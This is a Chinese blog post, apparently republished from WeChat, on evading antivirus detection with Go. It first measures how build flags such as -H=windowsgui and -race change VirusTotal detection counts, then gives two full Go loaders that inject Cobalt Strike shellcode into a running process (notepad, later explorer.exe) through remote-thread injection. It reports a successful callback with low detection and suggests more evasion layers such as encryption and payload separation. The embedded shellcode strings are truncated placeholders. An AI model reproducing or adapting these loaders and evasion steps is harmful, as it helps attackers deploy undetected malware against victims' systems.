> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/GrS6Kf7ZTDHT6cz_W1flfw)

一 go build 选项对查杀率的影响
--------------------

以下是编译选项对查杀率的影响：

> 代码

```
package main
import (
"fmt"
)
func main() {
fmt.Println("helloworld")
}
```

> 命令 1：go build 1.go 大小：2.05MB

helloworld 报毒，可真行

![](https://mmbiz.qpic.cn/mmbiz_jpg/B7aQ0TKN4UfLhaDOf8T1wFJxVvJDCSrJFibG1DQL4Rv5qFMbaIvUJQSwtcd3LOzoU8v7IZq9ZHMyrNEhknYrmrg/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfLhaDOf8T1wFJxVvJDCSrJRx4Sw1vKpia8HSGYrcM5F8Wtmy4FprTibC95EcpfFM8CQ4ejvYfMG5ug/640?wx_fmt=png)

> 命令 2：go build -ldflags="-s -w -H=windowsgui" -o flag2.exe 1.go 大小：1.44MB

这是网上大多数 ShellCodeLoader 文章所使用的编译方式，其中 - s 为 “去掉符号表”，-w 为 “去掉调试信息，不能作 gdb 调试”，多用作压缩体积。对于这两个选项，我们下面再进行实验。

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfLhaDOf8T1wFJxVvJDCSrJ0T1k1kMdUBmlm01w89UaI1iaOnOUT4AVMEichjfSruqUia23OU6gD678w/640?wx_fmt=png)

> 命令 3：go build -ldflags="-w -H=windowsgui" -o flag3.exe 1.go 大小：1.56MB

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfLhaDOf8T1wFJxVvJDCSrJlsJWxAtVl0C0wicJzziat9r39rDQIkBLPXRe5G4qvwia6jVhL8VG81SEA/640?wx_fmt=png)

> 命令 4：go build -ldflags="-s -H=windowsgui" -o flag4.exe 1.go 大小：1.44MB

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfLhaDOf8T1wFJxVvJDCSrJdgSx1dwrTdQSG0K46K4lWeT4C5Fic82nfLian3IHKPDk6RoE5QTX2eSQ/640?wx_fmt=png)

> 命令 5：go build -ldflags="-s" -o flag5.exe 1.go 大小：1.44MB

去除禁止 dos 窗口出现选项 “**-H=windowsgui**”，分别用 “**-s**” 和 “**-w**” 进行编译，体积明显缩小，且查出数都是 6/69，证明对查杀免杀影响最大的是 “**-H=windowsgui**” 选项。

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfLhaDOf8T1wFJxVvJDCSrJyFwm8HSe9Pykib5z9PTaxk7tJ44tAUHjtiasW6sib5RpKmxpSQGmWbjdg/640?wx_fmt=png)

> 命令 6：go build -ldflags="-s -w" -o flag6.exe -tags "thisistags" 1.go 大小：1.44MB

tags 影响不大，聊胜于无。

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfLhaDOf8T1wFJxVvJDCSrJd33Jktd0ibiaiagxyD0rP7Zbe3Yb7Scy2IsJXMAyp4vgVjCsuZ2kQ1sRw/640?wx_fmt=png)

> 命令 7：go build -ldflags="-X'main.Virus=fuck!Arg!'" -o flag7.exe 1.go 大小：2.05MB

修改代码如下： 

```
package main
import (
"fmt"
)
var Virus string //修改为字符串类型，使用-X进行传值“fuck！Arg！”
func main() {
//输出指定字符串，这里通过指定变量输出以方便后续实验
fmt.Printf("This is %s",Virus)
}
输出：>> This is fuck!Arg!
```

这里使用 **-X** 对代码里面的变量进行修改，这是一个思路，可以对 ShellCodeLoader 的某些符赋空，之后在编译的时候传参来绕过查杀，可以看到的确少了两个。

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfLhaDOf8T1wFJxVvJDCSrJNW3JKKFEjVqEAWPCyQtKS9phvLL4pW0WgE7dslMibLlcvIGicaK3x5gw/640?wx_fmt=png)

> 命令 8：go build -ldflags="-s -w -H=windowsgui" -o flag8.exe -race 1.go 大小：2.29MB

使用 “**-race**” 选项，使数据允许竞争检测，并加上容易报毒的 “**-H=windowsgui**” 选项，查杀率惨痛。

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfLhaDOf8T1wFJxVvJDCSrJTA5vDOf3iaFHtibYpLnxq3iaVOJWeGpiceYgJDrr905JOXeb8zxJuwE9Ug/640?wx_fmt=png)

> 命令 9：go build -ldflags="-s -w" -o flag9.exe -race 1.go 大小：2.29MB

在加上 “**-race**” 选项的基础上，去除 “**-H=windowsgui**”，诶~ 他妈的不误报了！

![](https://mmbiz.qpic.cn/mmbiz_jpg/B7aQ0TKN4UfLhaDOf8T1wFJxVvJDCSrJBMibQyRicgvDvUjXPL4a5Wd3P7JibaXyQj2LwOAV3vvq0ib7pnibBgfJ21w/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfLhaDOf8T1wFJxVvJDCSrJcAdIg8LIUM85oW2DtsKKSx9A9vrcyoiaAiaLBcxYBolUicZricKgHv0LKg/640?wx_fmt=png)

在经过上述一系列操作，证明使用如下参数可有效解决误报问题，而关于 **-race 竞争条件**选项各位感兴趣可以去查一下资料，这里就不赘述了。

```
go build -ldflags="-s -w" -o flag9.exe -race 1.go
```

另附上使用 **go build main.go** 和 **g****o buid -race main.go** 生成的 HelloWorld 查杀对比：

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfLhaDOf8T1wFJxVvJDCSrJibPqoDTWCr8rAboaxOlo1Hl0jhsyoMm7ib4nFzgdQPhyF04ea9J2gIEg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfLhaDOf8T1wFJxVvJDCSrJelRiabqeMAB90rTvwvONuFNo90bibGkZiabNrk0tA2gpgcUvxLxn14WAQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfLhaDOf8T1wFJxVvJDCSrJSLPeGhVmF7CoIp65zGUiaiaGuEFJpJh2icib7stTgxfst6Rkicz64T8YmfQ/640?wx_fmt=png)

二 开始实战
------

开始实战

从 gayhub 上找一份模板：

https://github.com/Esonhugh/goShellcodeLoader/blob/Skyworship/main.go

然而冗余代码过多，且编译时候存在 bug，加上 - race 选项就会出现问题（各种 bug，如运行了没效果，或者出现一大片的汇编代码，但是就是没有报错信息等等，老折磨人了），只能自己重写一份，参考资料放在文后，核心代码如下。

说一下大体思路，shellcode 加载大体分 **Loader 加载**、**线程注入加载**等方式，这里使用的**线程注入**的方式执行 shellcode，注入到某个进程中执行，而不是单独 Loader 加载。之所以使用这种查杀率比较**高**的方法，是因为可以配合 **-race** 选项来编译。如果让 Loader 单独运行，不加 “**-H=windowsgui**” 选项的话呢，那就会出现一个 Dos 窗口持续在前台运行，但是加了 **-H** 呢，正如前面提到的，这个是杀软的主要查杀特征，加了的话被查杀的概率大的离谱。所以就采用了线程注入方式来配合执行。

16 行的 dwProcessId = 35052 是我开启的一个 **notepad.exe** 的 pid。

```
package main

import (
  "encoding/hex"
  "fmt"
  "log"
  "syscall"
  "unsafe"
)

const (
  PROCESS_ALL_ACCESS     = 0x1F0FFF //OpenProcess中的第一个参数，获取最大权限
  MEM_COMMIT             = 0x1000
  MEM_RESERVE            = 0x2000
  PAGE_EXECUTE_READWRITE = 0x40
  dwProcessId            = 35052 //修改为某个进程的PID
)

var (
  kernel32             = syscall.NewLazyDLL("kernel32.dll")
  OpenProcess          = kernel32.NewProc("OpenProcess")
  VirtualAllocEx       = kernel32.NewProc("VirtualAllocEx")
  WriteProcessMemory   = kernel32.NewProc("WriteProcessMemory")
  CreateRemoteThreadEx = kernel32.NewProc("CreateRemoteThreadEx")
  VirtualProtectEx     = kernel32.NewProc("VirtualProtectEx")
)

func GetOpenProcess(dwProcessId int) uintptr {
  pHandle, _, _ := OpenProcess.Call(uintptr(PROCESS_ALL_ACCESS), uintptr(0), uintptr(dwProcessId))
  return pHandle
}

func injectProcessAndEx(pHandle uintptr, shellcode []byte) {
  Protect := PAGE_EXECUTE_READWRITE

  addr, _, err := VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
  if err != nil && err.Error() != "The operation completed successfully." {
    log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", err.Error()))
  }

  WriteProcessMemory.Call(uintptr(pHandle), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

  VirtualProtectEx.Call(uintptr(pHandle), addr, uintptr(len(shellcode)), PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&Protect)))

  CreateRemoteThreadEx.Call(uintptr(pHandle), 0, 0, addr, 0, 0, 0)
}

func main() {
  pHandle := GetOpenProcess(dwProcessId)

  ShellCodeHex := "fc4883e4041505b345c505a58353428505e00000000"
  //把字符串转为byte
  shellcode, err := hex.DecodeString(ShellCodeHex)
  if err != nil {
    log.Fatalln()
  }

  injectProcessAndEx(pHandle, shellcode)

}
```

重新使用 **go build main.go** 编译，VT 直接杀疯了：

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfLhaDOf8T1wFJxVvJDCSrJxQkeE1BicLbHVCqw6snH6Ujb9v2OiaDG7CBLGm1rqEln1n7iapwYQ4awg/640?wx_fmt=png)

之后使用 **go build -ldflags "-s -w" -race main.go** 编译，成功上线，VT 查杀如下。然而缺点是打开时 dos 窗口一闪而过，这里也可以使用 **-H=windowsgui 选项**去除窗口，但是随之而来的是 VT 查杀率上升。个人感觉得不偿失。

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfLhaDOf8T1wFJxVvJDCSrJ48lBnDRUUn7BG3gWy91q6W6V96ztP2l3CmzGh3nUcnhTDqejntw1Fg/640?wx_fmt=png)

三 整理代码
------

核心的代码的流程是通过线程注入方式执行 shellcode。但是很简陋，可以继续完善，比如说远程加载 shellcode，实现载荷分离等等操作。but，在做载荷分离的时候，导入 net/http 包，编译出的 exe 文件体积一下子就上去了，从 2MB 飙升到 9MB，于是放弃，准备把 shellcode 硬编码。

ok 那现在就是继续实现以下两个功能：

1.  通过进程名称获取 pid，这里使用的是 **CreateToolhelp32Snapshot** 和 **Process32Next** 来实现。
    
2.  对 shellcode 进行 base64 解码，及去除 **\x** 等操作。这样的话使用 Cobalt 生成的 shellcode 只要进行一次 base64 编码然后放入代码即可。
    

最终代码在文后，Github 地址：https://github.com/fcre1938/goShellCodeByPassVT

截至 2021/7/9/ 23:47 VT 查杀：

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfLhaDOf8T1wFJxVvJDCSrJHicKpHAHeIPibFwia7KJD5JiaAiantfZdZARTA14oa4yey2vaDaoAsicvicnA/640?wx_fmt=png)

PS:：一些免杀思路，如载荷分离、序列化、aes 加密、异或加密之类的都可以继续往上怼。应该也可以获得不错的免杀效果。

PPS：go 最近刚学的，用的属实糟心，不过在关键地方都打上注释了，欢迎 dalao 们 fork。

PPPS：吹一波嘶吼，写代码的时候跟着这篇走下来的。《代码注入技术之 Shellcode 注入》

参考资料：

**代码注入技术之 Shellcode 注入**

https://www.4hou.com/posts/7WW1

**免杀技术大杂烩 --- 乱拳也打不死老师傅**

https://github.com/Airboi/bypass-av-note

**yuppt 师傅的讲解**

https://www.bilibili.com/video/BV1Dh411h7t1?from=search&seid=16484602076793705202

**golang 编写免杀 shellcode 加载器**

https://www.bilibili.com/video/BV1uT4y1M7B2?from=search&seid=16484602076793705202

**github.com/DoumoizC2**

https://github.com/DoumoizC2/DoumoizC2/blob/4805a7fa1203a88e25d44c2d3277098fcf575eda/agents/resources/shellinject/shellcode_windows.go

**code-injection**

https://github.com/thepwnrip/code-injection

```
package main

import (
  "encoding/base64"
  "encoding/hex"
  "fmt"
  "log"
  "os"
  "strings"
  "syscall"
  "unsafe"
)

const (
  PROCESS_ALL_ACCESS     = 0x1F0FFF //OpenProcess中的第一个参数，获取最大权限
  MEM_COMMIT             = 0x1000
  MEM_RESERVE            = 0x2000
  PAGE_EXECUTE_READWRITE = 0x40
)

var (
  inProcessName            = "explorer.exe"    //需要注入的进程，可修改
  kernel32                 = syscall.NewLazyDLL("kernel32.dll")
  CreateToolhelp32Snapshot = kernel32.NewProc("CreateToolhelp32Snapshot")
  Process32Next            = kernel32.NewProc("Process32Next")
  CloseHandle              = kernel32.NewProc("CloseHandle")
  OpenProcess              = kernel32.NewProc("OpenProcess")
  VirtualAllocEx           = kernel32.NewProc("VirtualAllocEx")
  WriteProcessMemory       = kernel32.NewProc("WriteProcessMemory")
  CreateRemoteThreadEx     = kernel32.NewProc("CreateRemoteThreadEx")
  VirtualProtectEx         = kernel32.NewProc("VirtualProtectEx")
)

type ulong int32
type ulong_ptr uintptr
type PROCESSENTRY32 struct {
  dwSize              ulong
  cntUsage            ulong
  th32ProcessID       ulong
  th32DefaultHeapID   ulong_ptr
  th32ModuleID        ulong
  cntThreads          ulong
  th32ParentProcessID ulong
  pcPriClassBase      ulong
  dwFlags             ulong
  szExeFile           [260]byte
}

//根据进程名称获取进程pid
func GetPID() int {
  pHandle, _, _ := CreateToolhelp32Snapshot.Call(uintptr(0x2), uintptr(0x0))
  tasklist := make(map[string]int)
  var PID int
  if int(pHandle) == -1 {
    os.Exit(1)
  }
  //遍历所有进程，并保存至map
  for {
    var proc PROCESSENTRY32
    proc.dwSize = ulong(unsafe.Sizeof(proc))
    if rt, _, _ := Process32Next.Call(pHandle, uintptr(unsafe.Pointer(&proc))); int(rt) == 1 {
      ProcessName := string(proc.szExeFile[0:])
      //th32ModuleID := strconv.Itoa(int(proc.th32ModuleID))
      ProcessID := int(proc.th32ProcessID)
      tasklist[ProcessName] = ProcessID
    } else {
      break
    }
  }
  //从map中取出key为inProcessName的value
  for k, v := range tasklist {
    if strings.Contains(k, inProcessName) == true {
      PID = v
    }
  }
  _, _, _ = CloseHandle.Call(pHandle)

  return PID
}

//对base64编码的shellcode进行处理
func GetShellCode(b64body string) []byte {
  shellCodeB64, err := base64.StdEncoding.DecodeString(b64body)
  if err != nil {
    fmt.Printf("[!]Error b64decoding string : %s ", err.Error())
    os.Exit(1)
  }
  //转换处理
  shellcodeHex, _ := hex.DecodeString(strings.ReplaceAll(strings.ReplaceAll(string(shellCodeB64), "\n", ""), "\\x", ""))
  return shellcodeHex
}

//根据pid获取句柄
func GetOpenProcess(dwProcessId int) uintptr {
  pHandle, _, _ := OpenProcess.Call(uintptr(PROCESS_ALL_ACCESS), uintptr(0), uintptr(dwProcessId))
  return pHandle
}

//开辟内存空间执行shellcode
func injectProcessAndEx(pHandle uintptr, shellcode []byte) {
  Protect := PAGE_EXECUTE_READWRITE
  addr, _, err := VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
  if err != nil && err.Error() != "The operation completed successfully." {
    log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", err.Error()))
  }

  WriteProcessMemory.Call(uintptr(pHandle), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
  VirtualProtectEx.Call(uintptr(pHandle), addr, uintptr(len(shellcode)), PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&Protect)))
  CreateRemoteThreadEx.Call(uintptr(pHandle), 0, 0, addr, 0, 0, 0)
}

func main() {
  b64body := "XHhmY1x4NDFx4ZjBceGU4XHhjOFx4MDBceDAwXHgwMFx4NDFceDUxXHg0MVx4Nh"
  dwProcessId := GetPID()
  pHandle := GetOpenProcess(dwProcessId)
  shellCodeHex := GetShellCode(b64body)
  injectProcessAndEx(pHandle, shellCodeHex)
}
```